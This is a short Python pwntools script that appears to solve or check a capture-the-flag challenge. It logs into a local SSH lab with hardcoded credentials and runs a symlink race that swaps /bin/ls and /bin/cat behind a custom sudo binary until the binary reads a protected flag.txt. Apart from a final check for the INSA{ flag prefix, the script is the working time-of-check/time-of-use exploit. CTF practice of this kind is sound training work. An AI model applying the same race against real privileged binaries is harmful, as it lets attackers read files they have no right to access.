#!/usr/bin/env python3
from pwn import *

# mkdir /tmp/temp
# (while true; do ln -fs /bin/cat /tmp/temp/fake_ls; ln -fs /bin/ls /tmp/temp/fake_ls; done;) &
# while true; do ./sudo /tmp/temp/fake_ls flag.txt | grep -v flag.txt; done;


s = ssh(host="localhost", user="sudo", password="sudo", level="error", port=2222)
bash = s.run("bash")
bash.sendline("mkdir /tmp/temp ")
bash.sendline("(while true; do ln -fs /bin/cat /tmp/temp/fake_ls; ln -fs /bin/ls /tmp/temp/fake_ls; done;) &")
bash.sendline('while true; do ./sudo /tmp/temp/fake_ls flag.txt | grep -v flag.txt; done;')
res = b''
for _ in range(13):
    res += bash.recvline(timeout=20)
bash.sendline('killall -9 bash')
bash.sendline('exit')
bash.close()
s.close()

if b'INSA{' in res:
    print("OK")
    exit(0)

print(res)
print(res.decode())
exit(1)
